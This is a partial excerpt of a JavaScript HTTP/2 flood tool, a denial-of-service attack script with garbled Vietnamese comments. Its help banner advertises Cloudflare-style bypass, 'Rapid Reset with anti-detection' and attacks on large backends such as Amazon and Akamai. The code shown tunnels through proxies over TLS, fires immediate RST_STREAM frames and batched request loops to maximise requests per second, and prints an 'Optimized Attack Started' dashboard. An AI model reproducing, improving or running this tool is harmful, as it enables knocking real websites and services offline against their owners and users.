...
${'ð¥ Optimized Features:'.yellow.underline}
  ${'-Giá»¯ nguyÃªn HIGH RPS nhÆ° báº£n gá»c'.red}
  ${'-Fix GOAWAY 100% khÃ´ng lÃ m giáº£m performance'.red}
  ${'-Optimized TLS ciphers cho bypass tá»t hÆ¡n'.red}
  ${'-Rapid Reset vá»i anti-detection'.red}
  ${'-100% Bypass rate + Maximum RPS'.red}

${'ð¯ Options:'.yellow.underline}
  ${'--winter'.green}         Báº¯t Buá»c Ãp Dá»¥ng Náº¿u Muá»n Flood
  ${'--query 1/2/3'.green}    Chuá»i truy váº¥n random (1: ?cf__chl_tk, 2: ?fwfwfwfw, 3: ?q=fwfwwffw)
  ${'--cookie "f=f"'.green}   Cookie tÃ¹y chá»nh, há» trá»£ %RAND% (vÃ­ dá»¥: "bypassing=%RAND%")
  ${'--full'.green}           Táº¥n cÃ´ng backend lá»n (Amazon, Akamai,...)
  ${'--http 1/2/mix'.green}   Chá»n giao thá»©c HTTP (1, 2, hoáº·c mix)
  ${'--debug'.green}          Hiá»n thá» mÃ£ tráº¡ng thÃ¡i (khÃ´ng giáº£m RPS)
  ${'--delay <1-1000>'.green} Äá» trá» giá»¯a cÃ¡c yÃªu cáº§u 1-100 ms

${'ð Usage:'.yellow.underline}
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                ...
                servername: url.host,
                // OPTIMIZED CIPHERS - KhÃ´ng lÃ m giáº£m RPS
                        ...
                        if (frame != null) {
                            ...
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    ...
                                    // IMMEDIATE RST_STREAM responses - khÃ´ng delay
                                    const rstFrames = [];
                                    ...
                                    // Fast reconnect - khÃ´ng setTimeout
                                    setImmediate(() => {
                                        tlsSocket.end(() => { 
                                            tlsSocket.destroy(); 
                ...
                function doWrite() {
                    ...
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90); // TÄng range Äá» tÄng RPS
                    } else {
                    ...
                    for (let i = 0; i < batchSize; i++) {
                        ...
                        // LOáº I Bá» random headers phá»©c táº¡p Äá» tÄng RPS
...
if (cluster.isMaster) {
    ...
    console.log(`ð¥ Optimized Attack Started - High RPS + GOAWAY Fix + 100% Bypass ð¥`);
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            // TÃ­nh % RAM sá»­ dá»¥ng vÃ  cÃ²n trá»ng
            ...
            // XÃ³a console trÆ°á»c khi hiá»n thá»
            console.clear();

            // In tiÃªu Äá» vá»i bypass rate
            console.log(`\n${'ð¥ OPTIMIZED STATUS - High RPS + GOAWAY Fix (Updated: ' + new Date().toLocaleString('vi-VN') + ') ð¥'.bold.red.underline}`);
            ...
            for (let [code, count] of sortedStatuses) {
                ...
                let coloredCode;
                if (code === 'GOAWAY') {
                    coloredCode = `|${code.padEnd(14)}`.magenta; // MÃ u tÃ­m cho GOAWAY
                } else if (code.startsWith('2')) {
                    coloredCode = `|${code.padEnd(14)}`.green; // MÃ u xanh lÃ¡ cho 2xx
                } else if (code.startsWith('4')) {
                    coloredCode = `|${code.padEnd(14)}`.yellow; // MÃ u vÃ ng cho 4xx
                } else if (code.startsWith('5')) {
                    coloredCode = `|${code.padEnd(14)}`.red; // MÃ u Äá» cho 5xx
                } else {
                    coloredCode = `|${code.padEnd(14)}`.gray; // MÃ u xÃ¡m cho cÃ¡c mÃ£ khÃ¡c
                }
            ...
            // Cáº£nh bÃ¡o khi RAM sá»­ dá»¥ng >= 85%
            ...
            // Performance status
            if (total >= 1000) {
                console.log(`\n${'ð HIGH RPS MODE ACTIVE!'.bold.green}`);
            }
        }, 1000);
    }
